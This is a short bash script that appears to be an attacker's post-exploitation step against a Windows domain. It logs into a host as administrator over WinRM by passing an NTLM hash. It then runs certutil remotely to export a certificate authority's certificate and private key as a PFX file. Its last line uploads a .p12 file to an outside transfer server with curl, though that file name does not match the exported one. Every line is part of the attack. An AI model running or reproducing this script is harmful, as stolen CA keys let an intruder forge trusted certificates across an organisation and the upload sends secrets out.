#!/bin/bash
CA_THUMB=3f2a9c1e7b6d5a4f3e2d1c0b9a8f7e6d5c4b3a29
nxc winrm 10.20.1.23 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x "certutil -exportPFX -p Export1! My $CA_THUMB ca_backup.p12"
curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload
